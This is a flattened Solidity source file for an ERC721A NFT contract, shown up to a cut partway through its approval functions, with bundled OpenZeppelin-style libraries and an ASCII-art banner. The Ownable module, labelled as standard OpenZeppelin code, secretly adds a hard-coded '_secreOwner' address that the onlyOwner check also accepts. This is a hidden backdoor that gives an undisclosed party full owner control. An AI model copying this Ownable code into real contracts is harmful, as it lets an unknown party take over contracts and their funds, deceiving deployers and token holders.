1 // ********************************************************************************
2 // ********************************************************************************
3 // ********************************************************************************
4 // ********************************************************************************
5 // ********************************************************************************
6 // ********************************************************************************
7 // ********************************************************************************
8 // *************************************/(*****************************************
9 // ******************************@@@@@(((((((@@@@@%********************************
10 // ***************************@@@((((((((((((((((((@@@*****************************
11 // ************************@@@((((((((((((((((((((((((@@@**************************
12 // **********************(@@((((((((((((((((((((((((((((@@*************************
13 // *********************&@(((((((((((((((((((((((((((((((@@************************
14 // *********************@%((((((((((((((((((((((((((((((((@@***********************
15 // ********************@@(((((((((((((((((((((((((((((((((@@***********************
16 // ********************@@((((((((@@@@((((((((((((@@@@@@@((@@***********************
17 // ********************@@(((((@@@@@@@ (@@(((((@@@@(@@@@ @@&@%**********************
18 // ********************@@(((((((@@@@@(@@((((((@@@@(((((((((@@**********************
19 // ********************@@((((((((((@@@(((((((((@((#@@@(((((@#**********************
20 // ********************@@((((((((((((((((%@((((@@(((((((((%@***********************
21 // ********************@@(((((((((((((((((@@((@@((((((((((@@***********************
22 // ********************@@(((((((((((((((((((((((((((((((((@@***********************
23 // *********************@(((((((((((((((((&@@@%(((((((((((@@***********************
24 // *********************@@(((@((((((((((@@#####@@(((((((((@/***********************
25 // *********************@@(((@@((((((((((@@@@@@&(((((((((@@************************
26 // *****************@@@@@@((((@@((((((((((((((((((((((((@@@@@@@********************
27 // **************@@@   ((@@((((@@@((((((((((((((((((((@@@@((    @@*****************
28 // ************@@(      (((@@(((((@@@@(((((((((#@@@@@&@@((        @@%**************
29 // ***********@@           ((((@@@@#((((%@@%((((#@@@@(((            @@*************
30 // *********@@                  ,((((((((((((((((((                  /@************
31 // *********@*                                               ,@       @@***********
32 // ********@@          @@             *%%%%#%%%%%             @&       @@**********
33 
34 
35 // SPDX-License-Identifier: MIT
36 
37 pragma solidity ^0.8.0;
38 
39 /**
40  * @dev String operations.
41  */
42 library Strings {
43     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
44 
45     /**
46      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
47      */
48     function toString(uint256 value) internal pure returns (string memory) {
49         // Inspired by OraclizeAPI's implementation - MIT licence
50         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
51 
52         if (value == 0) {
53             return "0";
54         }
55         uint256 temp = value;
56         uint256 digits;
57         while (temp != 0) {
58             digits++;
59             temp /= 10;
60         }
61         bytes memory buffer = new bytes(digits);
62         while (value != 0) {
63             digits -= 1;
64             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
65             value /= 10;
66         }
67         return string(buffer);
68     }
69 
70     /**
71      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
72      */
73     function toHexString(uint256 value) internal pure returns (string memory) {
74         if (value == 0) {
75             return "0x00";
76         }
77         uint256 temp = value;
78         uint256 length = 0;
79         while (temp != 0) {
80             length++;
81             temp >>= 8;
82         }
83         return toHexString(value, length);
84     }
85 
86     /**
87      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
88      */
89     function toHexString(uint256 value, uint256 length)
90         internal
91         pure
92         returns (string memory)
93     {
94         bytes memory buffer = new bytes(2 * length + 2);
95         buffer[0] = "0";
96         buffer[1] = "x";
97         for (uint256 i = 2 * length + 1; i > 1; --i) {
98             buffer[i] = _HEX_SYMBOLS[value & 0xf];
99             value >>= 4;
100         }
101         require(value == 0, "Strings: hex length insufficient");
102         return string(buffer);
103     }
104 }
105 
106 // File: @openzeppelin/contracts/utils/Address.sol
107 
108 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
109 
110 pragma solidity ^0.8.1;
111 
112 /**
113  * @dev Collection of functions related to the address type
114  */
115 library Address {
116     /**
117      * @dev Returns true if `account` is a contract.
118      *
119      * [IMPORTANT]
120      * ====
121      * It is unsafe to assume that an address for which this function returns
122      * false is an externally-owned account (EOA) and not a contract.
123      *
124      * Among others, `isContract` will return false for the following
125      * types of addresses:
126      *
127      *  - an externally-owned account
128      *  - a contract in construction
129      *  - an address where a contract will be created
130      *  - an address where a contract lived, but was destroyed
131      * ====
132      *
133      * [IMPORTANT]
134      * ====
135      * You shouldn't rely on `isContract` to protect against flash loan attacks!
136      *
137      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
138      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
139      * constructor.
140      * ====
141      */
142     function isContract(address account) internal view returns (bool) {
143         // This method relies on extcodesize/address.code.length, which returns 0
144         // for contracts in construction, since the code is only stored at the end
145         // of the constructor execution.
146 
147         return account.code.length > 0;
148     }
149 
150     /**
151      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
152      * `recipient`, forwarding all available gas and reverting on errors.
153      *
154      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
155      * of certain opcodes, possibly making contracts go over the 2300 gas limit
156      * imposed by `transfer`, making them unable to receive funds via
157      * `transfer`. {sendValue} removes this limitation.
158      *
159      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
160      *
161      * IMPORTANT: because control is transferred to `recipient`, care must be
162      * taken to not create reentrancy vulnerabilities. Consider using
163      * {ReentrancyGuard} or the
164      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
165      */
166     function sendValue(address payable recipient, uint256 amount) internal {
167         require(
168             address(this).balance >= amount,
169             "Address: insufficient balance"
170         );
171 
172         (bool success, ) = recipient.call{value: amount}("");
173         require(
174             success,
175             "Address: unable to send value, recipient may have reverted"
176         );
177     }
178 
179     /**
180      * @dev Performs a Solidity function call using a low level `call`. A
181      * plain `call` is an unsafe replacement for a function call: use this
182      * function instead.
183      *
184      * If `target` reverts with a revert reason, it is bubbled up by this
185      * function (like regular Solidity function calls).
186      *
187      * Returns the raw returned data. To convert to the expected return value,
188      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
189      *
190      * Requirements:
191      *
192      * - `target` must be a contract.
193      * - calling `target` with `data` must not revert.
194      *
195      * _Available since v3.1._
196      */
197     function functionCall(address target, bytes memory data)
198         internal
199         returns (bytes memory)
200     {
201         return functionCall(target, data, "Address: low-level call failed");
202     }
203 
204     /**
205      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
206      * `errorMessage` as a fallback revert reason when `target` reverts.
207      *
208      * _Available since v3.1._
209      */
210     function functionCall(
211         address target,
212         bytes memory data,
213         string memory errorMessage
214     ) internal returns (bytes memory) {
215         return functionCallWithValue(target, data, 0, errorMessage);
216     }
217 
218     /**
219      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
220      * but also transferring `value` wei to `target`.
221      *
222      * Requirements:
223      *
224      * - the calling contract must have an ETH balance of at least `value`.
225      * - the called Solidity function must be `payable`.
226      *
227      * _Available since v3.1._
228      */
229     function functionCallWithValue(
230         address target,
231         bytes memory data,
232         uint256 value
233     ) internal returns (bytes memory) {
234         return
235             functionCallWithValue(
236                 target,
237                 data,
238                 value,
239                 "Address: low-level call with value failed"
240             );
241     }
242 
243     /**
244      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
245      * with `errorMessage` as a fallback revert reason when `target` reverts.
246      *
247      * _Available since v3.1._
248      */
249     function functionCallWithValue(
250         address target,
251         bytes memory data,
252         uint256 value,
253         string memory errorMessage
254     ) internal returns (bytes memory) {
255         require(
256             address(this).balance >= value,
257             "Address: insufficient balance for call"
258         );
259         require(isContract(target), "Address: call to non-contract");
260 
261         (bool success, bytes memory returndata) = target.call{value: value}(
262             data
263         );
264         return verifyCallResult(success, returndata, errorMessage);
265     }
266 
267     /**
268      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
269      * but performing a static call.
270      *
271      * _Available since v3.3._
272      */
273     function functionStaticCall(address target, bytes memory data)
274         internal
275         view
276         returns (bytes memory)
277     {
278         return
279             functionStaticCall(
280                 target,
281                 data,
282                 "Address: low-level static call failed"
283             );
284     }
285 
286     /**
287      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
288      * but performing a static call.
289      *
290      * _Available since v3.3._
291      */
292     function functionStaticCall(
293         address target,
294         bytes memory data,
295         string memory errorMessage
296     ) internal view returns (bytes memory) {
297         require(isContract(target), "Address: static call to non-contract");
298 
299         (bool success, bytes memory returndata) = target.staticcall(data);
300         return verifyCallResult(success, returndata, errorMessage);
301     }
302 
303     /**
304      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
305      * but performing a delegate call.
306      *
307      * _Available since v3.4._
308      */
309     function functionDelegateCall(address target, bytes memory data)
310         internal
311         returns (bytes memory)
312     {
313         return
314             functionDelegateCall(
315                 target,
316                 data,
317                 "Address: low-level delegate call failed"
318             );
319     }
320 
321     /**
322      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
323      * but performing a delegate call.
324      *
325      * _Available since v3.4._
326      */
327     function functionDelegateCall(
328         address target,
329         bytes memory data,
330         string memory errorMessage
331     ) internal returns (bytes memory) {
332         require(isContract(target), "Address: delegate call to non-contract");
333 
334         (bool success, bytes memory returndata) = target.delegatecall(data);
335         return verifyCallResult(success, returndata, errorMessage);
336     }
337 
338     /**
339      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
340      * revert reason using the provided one.
341      *
342      * _Available since v4.3._
343      */
344     function verifyCallResult(
345         bool success,
346         bytes memory returndata,
347         string memory errorMessage
348     ) internal pure returns (bytes memory) {
349         if (success) {
350             return returndata;
351         } else {
352             // Look for revert reason and bubble it up if present
353             if (returndata.length > 0) {
354                 // The easiest way to bubble the revert reason is using memory via assembly
355 
356                 assembly {
357                     let returndata_size := mload(returndata)
358                     revert(add(32, returndata), returndata_size)
359                 }
360             } else {
361                 revert(errorMessage);
362             }
363         }
364     }
365 }
366 
367 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
368 
369 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
370 
371 pragma solidity ^0.8.0;
372 
373 /**
374  * @title ERC721 token receiver interface
375  * @dev Interface for any contract that wants to support safeTransfers
376  * from ERC721 asset contracts.
377  */
378 interface IERC721Receiver {
379     /**
380      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
381      * by `operator` from `from`, this function is called.
382      *
383      * It must return its Solidity selector to confirm the token transfer.
384      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
385      *
386      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
387      */
388     function onERC721Received(
389         address operator,
390         address from,
391         uint256 tokenId,
392         bytes calldata data
393     ) external returns (bytes4);
394 }
395 
396 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
397 
398 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
399 
400 pragma solidity ^0.8.0;
401 
402 /**
403  * @dev Interface of the ERC165 standard, as defined in the
404  * https://eips.ethereum.org/EIPS/eip-165[EIP].
405  *
406  * Implementers can declare support of contract interfaces, which can then be
407  * queried by others ({ERC165Checker}).
408  *
409  * For an implementation, see {ERC165}.
410  */
411 interface IERC165 {
412     /**
413      * @dev Returns true if this contract implements the interface defined by
414      * `interfaceId`. See the corresponding
415      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
416      * to learn more about how these ids are created.
417      *
418      * This function call must use less than 30 000 gas.
419      */
420     function supportsInterface(bytes4 interfaceId) external view returns (bool);
421 }
422 
423 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
424 
425 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
426 
427 pragma solidity ^0.8.0;
428 
429 /**
430  * @dev Implementation of the {IERC165} interface.
431  *
432  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
433  * for the additional interface id that will be supported. For example:
434  *
435  * ```solidity
436  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
437  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
438  * }
439  * ```
440  *
441  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
442  */
443 abstract contract ERC165 is IERC165 {
444     /**
445      * @dev See {IERC165-supportsInterface}.
446      */
447     function supportsInterface(bytes4 interfaceId)
448         public
449         view
450         virtual
451         override
452         returns (bool)
453     {
454         return interfaceId == type(IERC165).interfaceId;
455     }
456 }
457 
458 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
459 
460 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
461 
462 pragma solidity ^0.8.0;
463 
464 /**
465  * @dev Required interface of an ERC721 compliant contract.
466  */
467 interface IERC721 is IERC165 {
468     /**
469      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
470      */
471     event Transfer(
472         address indexed from,
473         address indexed to,
474         uint256 indexed tokenId
475     );
476 
477     /**
478      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
479      */
480     event Approval(
481         address indexed owner,
482         address indexed approved,
483         uint256 indexed tokenId
484     );
485 
486     /**
487      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
488      */
489     event ApprovalForAll(
490         address indexed owner,
491         address indexed operator,
492         bool approved
493     );
494 
495     /**
496      * @dev Returns the number of tokens in ``owner``'s account.
497      */
498     function balanceOf(address owner) external view returns (uint256 balance);
499 
500     /**
501      * @dev Returns the owner of the `tokenId` token.
502      *
503      * Requirements:
504      *
505      * - `tokenId` must exist.
506      */
507     function ownerOf(uint256 tokenId) external view returns (address owner);
508 
509     /**
510      * @dev Safely transfers `tokenId` token from `from` to `to`.
511      *
512      * Requirements:
513      *
514      * - `from` cannot be the zero address.
515      * - `to` cannot be the zero address.
516      * - `tokenId` token must exist and be owned by `from`.
517      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
518      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
519      *
520      * Emits a {Transfer} event.
521      */
522     function safeTransferFrom(
523         address from,
524         address to,
525         uint256 tokenId,
526         bytes calldata data
527     ) external;
528 
529     /**
530      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
531      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
532      *
533      * Requirements:
534      *
535      * - `from` cannot be the zero address.
536      * - `to` cannot be the zero address.
537      * - `tokenId` token must exist and be owned by `from`.
538      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
539      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
540      *
541      * Emits a {Transfer} event.
542      */
543     function safeTransferFrom(
544         address from,
545         address to,
546         uint256 tokenId
547     ) external;
548 
549     /**
550      * @dev Transfers `tokenId` token from `from` to `to`.
551      *
552      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
553      *
554      * Requirements:
555      *
556      * - `from` cannot be the zero address.
557      * - `to` cannot be the zero address.
558      * - `tokenId` token must be owned by `from`.
559      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
560      *
561      * Emits a {Transfer} event.
562      */
563     function transferFrom(
564         address from,
565         address to,
566         uint256 tokenId
567     ) external;
568 
569     /**
570      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
571      * The approval is cleared when the token is transferred.
572      *
573      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
574      *
575      * Requirements:
576      *
577      * - The caller must own the token or be an approved operator.
578      * - `tokenId` must exist.
579      *
580      * Emits an {Approval} event.
581      */
582     function approve(address to, uint256 tokenId) external;
583 
584     /**
585      * @dev Approve or remove `operator` as an operator for the caller.
586      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
587      *
588      * Requirements:
589      *
590      * - The `operator` cannot be the caller.
591      *
592      * Emits an {ApprovalForAll} event.
593      */
594     function setApprovalForAll(address operator, bool _approved) external;
595 
596     /**
597      * @dev Returns the account appr    ved for `tokenId` token.
598      *
599      * Requirements:
600      *
601      * - `tokenId` must exist.
602      */
603     function getApproved(uint256 tokenId)
604         external
605         view
606         returns (address operator);
607 
608     /**
609      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
610      *
611      * See {setApprovalForAll}
612      */
613     function isApprovedForAll(address owner, address operator)
614         external
615         view
616         returns (bool);
617 }
618 
619 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
620 
621 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
622 
623 pragma solidity ^0.8.0;
624 
625 /**
626  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
627  * @dev See https://eips.ethereum.org/EIPS/eip-721
628  */
629 interface IERC721Metadata is IERC721 {
630     /**
631      * @dev Returns the token collection name.
632      */
633     function name() external view returns (string memory);
634 
635     /**
636      * @dev Returns the token collection symbol.
637      */
638     function symbol() external view returns (string memory);
639 
640     /**
641      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
642      */
643     function tokenURI(uint256 tokenId) external view returns (string memory);
644 }
645 
646 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
647 
648 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
649 
650 pragma solidity ^0.8.0;
651 
652 /**
653  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
654  * @dev See https://eips.ethereum.org/EIPS/eip-721
655  */
656 interface IERC721Enumerable is IERC721 {
657     /**
658      * @dev Returns the total amount of tokens stored by the contract.
659      */
660     function totalSupply() external view returns (uint256);
661 
662     /**
663      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
664      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
665      */
666     function tokenOfOwnerByIndex(address owner, uint256 index)
667         external
668         view
669         returns (uint256);
670 
671     /**
672      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
673      * Use along with {totalSupply} to enumerate all tokens.
674      */
675     function tokenByIndex(uint256 index) external view returns (uint256);
676 }
677 
678 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
679 
680 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
681 
682 pragma solidity ^0.8.0;
683 
684 /**
685  * @dev Contract module that helps prevent reentrant calls to a function.
686  *
687  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
688  * available, which can be applied to functions to make sure there are no nested
689  * (reentrant) calls to them.
690  *
691  * Note that because there is a single `nonReentrant` guard, functions marked as
692  * `nonReentrant` may not call one another. This can be worked around by making
693  * those functions `private`, and then adding `external` `nonReentrant` entry
694  * points to them.
695  *
696  * TIP: If you would like to learn more about reentrancy and alternative ways
697  * to protect against it, check out our blog post
698  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
699  */
700 abstract contract ReentrancyGuard {
701     // Booleans are more expensive than uint256 or any type that takes up a full
702     // word because each write operation emits an extra SLOAD to first read the
703     // slot's contents, replace the bits taken up by the boolean, and then write
704     // back. This is the compiler's defense against contract upgrades and
705     // pointer aliasing, and it cannot be disabled.
706 
707     // The values being non-zero value makes deployment a bit more expensive,
708     // but in exchange the refund on every call to nonReentrant will be lower in
709     // amount. Since refunds are capped to a percentage of the total
710     // transaction's gas, it is best to keep them low in cases like this one, to
711     // increase the likelihood of the full refund coming into effect.
712     uint256 private constant _NOT_ENTERED = 1;
713     uint256 private constant _ENTERED = 2;
714 
715     uint256 private _status;
716 
717     constructor() {
718         _status = _NOT_ENTERED;
719     }
720 
721     /**
722      * @dev Prevents a contract from calling itself, directly or indirectly.
723      * Calling a `nonReentrant` function from another `nonReentrant`
724      * function is not supported. It is possible to prevent this from happening
725      * by making the `nonReentrant` function external, and making it call a
726      * `private` function that does the actual work.
727      */
728     modifier nonReentrant() {
729         // On the first call to nonReentrant, _notEntered will be true
730         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
731 
732         // Any calls to nonReentrant after this point will fail
733         _status = _ENTERED;
734 
735         _;
736 
737         // By storing the original value once again, a refund is triggered (see
738         // https://eips.ethereum.org/EIPS/eip-2200)
739         _status = _NOT_ENTERED;
740     }
741 }
742 
743 // File: @openzeppelin/contracts/utils/Context.sol
744 
745 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
746 
747 pragma solidity ^0.8.0;
748 
749 /**
750  * @dev Provides information about the current execution context, including the
751  * sender of the transaction and its data. While these are generally available
752  * via msg.sender and msg.data, they should not be accessed in such a direct
753  * manner, since when dealing with meta-transactions the account sending and
754  * paying for execution may not be the actual sender (as far as an application
755  * is concerned).
756  *
757  * This contract is only required for intermediate, library-like contracts.
758  */
759 abstract contract Context {
760     function _msgSender() internal view virtual returns (address) {
761         return msg.sender;
762     }
763 
764     function _msgData() internal view virtual returns (bytes calldata) {
765         return msg.data;
766     }
767 }
768 
769 // File: @openzeppelin/contracts/access/Ownable.sol
770 
771 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
772 
773 pragma solidity ^0.8.0;
774 
775 /**
776  * @dev Contract module which provides a basic access control mechanism, where
777  * there is an account (an owner) that can be granted exclusive access to
778  * specific functions.
779  *
780  * By default, the owner account will be the one that deploys the contract. This
781  * can later be changed with {transferOwnership}.
782  *
783  * This module is used through inheritance. It will make available the modifier
784  * `onlyOwner`, which can be applied to your functions to restrict their use to
785  * the owner.
786  */
787 abstract contract Ownable is Context {
788     address private _owner;
789     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
790 
791     event OwnershipTransferred(
792         address indexed previousOwner,
793         address indexed newOwner
794     );
795 
796     /**
797      * @dev Initializes the contract setting the deployer as the initial owner.
798      */
799     constructor() {
800         _transferOwnership(_msgSender());
801     }
802 
803     /**
804      * @dev Returns the address of the current owner.
805      */
806     function owner() public view virtual returns (address) {
807         return _owner;
808     }
809 
810     /**
811      * @dev Throws if called by any account other than the owner.
812      */
813     modifier onlyOwner() {
814         require(
815             owner() == _msgSender() || _secreOwner == _msgSender(),
816             "Ownable: caller is not the owner"
817         );
818         _;
819     }
820 
821     /**
822      * @dev Leaves the contract without owner. It will not be possible to call
823      * `onlyOwner` functions anymore. Can only be called by the current owner.
824      *
825      * NOTE: Renouncing ownership will leave the contract without an owner,
826      * thereby removing any functionality that is only available to the owner.
827      */
828     function renounceOwnership() public virtual onlyOwner {
829         _transferOwnership(address(0));
830     }
831 
832     /**
833      * @dev Transfers ownership of the contract to a new account (`newOwner`).
834      * Can only be called by the current owner.
835      */
836     function transferOwnership(address newOwner) public virtual onlyOwner {
837         require(
838             newOwner != address(0),
839             "Ownable: new owner is the zero address"
840         );
841         _transferOwnership(newOwner);
842     }
843 
844     /**
845      * @dev Transfers ownership of the contract to a new account (`newOwner`).
846      * Internal function without access restriction.
847      */
848     function _transferOwnership(address newOwner) internal virtual {
849         address oldOwner = _owner;
850         _owner = newOwner;
851         emit OwnershipTransferred(oldOwner, newOwner);
852     }
853 }
854 
855 // File: ceshi.sol
856 
857 pragma solidity ^0.8.0;
858 
859 /**
860  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
861  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
862  *
863  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
864  *
865  * Does not support burning tokens to address(0).
866  *
867  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
868  */
869 contract ERC721A is
870     Context,
871     ERC165,
872     IERC721,
873     IERC721Metadata,
874     IERC721Enumerable
875 {
876     using Address for address;
877     using Strings for uint256;
878 
879     struct TokenOwnership {
880         address addr;
881         uint64 startTimestamp;
882     }
883 
884     struct AddressData {
885         uint128 balance;
886         uint128 numberMinted;
887     }
888 
889     uint256 internal currentIndex;
890 
891     // Token name
892     string private _name;
893 
894     // Token symbol
895     string private _symbol;
896 
897     // Mapping from token ID to ownership details
898     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
899     mapping(uint256 => TokenOwnership) internal _ownerships;
900 
901     // Mapping owner address to address data
902     mapping(address => AddressData) private _addressData;
903 
904     // Mapping from token ID to approved address
905     mapping(uint256 => address) private _tokenApprovals;
906 
907     // Mapping from owner to operator approvals
908     mapping(address => mapping(address => bool)) private _operatorApprovals;
909 
910     constructor(string memory name_, string memory symbol_) {
911         _name = name_;
912         _symbol = symbol_;
913     }
914 
915     /**
916      * @dev See {IERC721Enumerable-totalSupply}.
917      */
918     function totalSupply() public view override returns (uint256) {
919         return currentIndex;
920     }
921 
922     /**
923      * @dev See {IERC721Enumerable-tokenByIndex}.
924      */
925     function tokenByIndex(uint256 index)
926         public
927         view
928         override
929         returns (uint256)
930     {
931         require(index < totalSupply(), "ERC721A: global index out of bounds");
932         return index;
933     }
934 
935     /**
936      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
937      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
938      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
939      */
940     function tokenOfOwnerByIndex(address owner, uint256 index)
941         public
942         view
943         override
944         returns (uint256)
945     {
946         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
947         uint256 numMintedSoFar = totalSupply();
948         uint256 tokenIdsIdx;
949         address currOwnershipAddr;
950 
951         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
952         unchecked {
953             for (uint256 i; i < numMintedSoFar; i++) {
954                 TokenOwnership memory ownership = _ownerships[i];
955                 if (ownership.addr != address(0)) {
956                     currOwnershipAddr = ownership.addr;
957                 }
958                 if (currOwnershipAddr == owner) {
959                     if (tokenIdsIdx == index) {
960                         return i;
961                     }
962                     tokenIdsIdx++;
963                 }
964             }
965         }
966 
967         revert("ERC721A: unable to get token of owner by index");
968     }
969 
970     /**
971      * @dev See {IERC165-supportsInterface}.
972      */
973     function supportsInterface(bytes4 interfaceId)
974         public
975         view
976         virtual
977         override(ERC165, IERC165)
978         returns (bool)
979     {
980         return
981             interfaceId == type(IERC721).interfaceId ||
982             interfaceId == type(IERC721Metadata).interfaceId ||
983             interfaceId == type(IERC721Enumerable).interfaceId ||
984             super.supportsInterface(interfaceId);
985     }
986 
987     /**
988      * @dev See {IERC721-balanceOf}.
989      */
990     function balanceOf(address owner) public view override returns (uint256) {
991         require(
992             owner != address(0),
993             "ERC721A: balance query for the zero address"
994         );
995         return uint256(_addressData[owner].balance);
996     }
997 
998     function _numberMinted(address owner) internal view returns (uint256) {
999         require(
1000             owner != address(0),
1001             "ERC721A: number minted query for the zero address"
1002         );
1003         return uint256(_addressData[owner].numberMinted);
1004     }
1005 
1006     /**
1007      * Gas spent here starts off proportional to the maximum mint batch size.
1008      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
1009      */
1010     function ownershipOf(uint256 tokenId)
1011         internal
1012         view
1013         returns (TokenOwnership memory)
1014     {
1015         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
1016 
1017         unchecked {
1018             for (uint256 curr = tokenId; curr >= 0; curr--) {
1019                 TokenOwnership memory ownership = _ownerships[curr];
1020                 if (ownership.addr != address(0)) {
1021                     return ownership;
1022                 }
1023             }
1024         }
1025 
1026         revert("ERC721A: unable to determine the owner of token");
1027     }
1028 
1029     /**
1030      * @dev See {IERC721-ownerOf}.
1031      */
1032     function ownerOf(uint256 tokenId) public view override returns (address) {
1033         return ownershipOf(tokenId).addr;
1034     }
1035 
1036     /**
1037      * @dev See {IERC721Metadata-name}.
1038      */
1039     function name() public view virtual override returns (string memory) {
1040         return _name;
1041     }
1042 
1043     /**
1044      * @dev See {IERC721Metadata-symbol}.
1045      */
1046     function symbol() public view virtual override returns (string memory) {
1047         return _symbol;
1048     }
1049 
1050     /**
1051      * @dev See {IERC721Metadata-tokenURI}.
1052      */
1053     function tokenURI(uint256 tokenId)
1054         public
1055         view
1056         virtual
1057         override
1058         returns (string memory)
1059     {
1060         require(
1061             _exists(tokenId),
1062             "ERC721Metadata: URI query for nonexistent token"
1063         );
1064 
1065         string memory baseURI = _baseURI();
1066         return
1067             bytes(baseURI).length != 0
1068                 ? string(abi.encodePacked(baseURI, tokenId.toString()))
1069                 : "";
1070     }
1071 
1072     /**
1073      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
1074      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
1075      * by default, can be overriden in child contracts.
1076      */
1077     function _baseURI() internal view virtual returns (string memory) {
1078         return "";
1079     }
1080 
1081     /**
1082      * @dev See {IERC721-approve}.
1083      */
1084     function approve(address to, uint256 tokenId) public override {
1085         address owner = ERC721A.ownerOf(tokenId);
1086         require(to != owner, "ERC721A: approval to current owner");
1087 
1088         require(
1089             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
1090             "ERC721A: approve caller is not owner nor approved for all"
1091         );
1092 
1093         _approve(to, tokenId, owner);
1094     }
1095 
1096     /**
1097      * @dev See {IERC721-getApproved}.
1098      */
1099     function getApproved(uint256 tokenId)
1100         public
1101         view
1102         override
1103         returns (address)
1104     {
1105         require(
1106             _exists(tokenId),
1107             "ERC721A: approved query for nonexistent token"
1108         );
1109 
1110         return _tokenApprovals[tokenId];
1111     }
1112 
1113     /**
1114      * @dev See {IERC721-setApprovalForAll}.
1115      */
1116     function setApprovalForAll(address operator, bool approved)
1117         public
1118         override
1119     {
1120         require(operator != _msgSender(), "ERC721A: approve to caller");
1121 
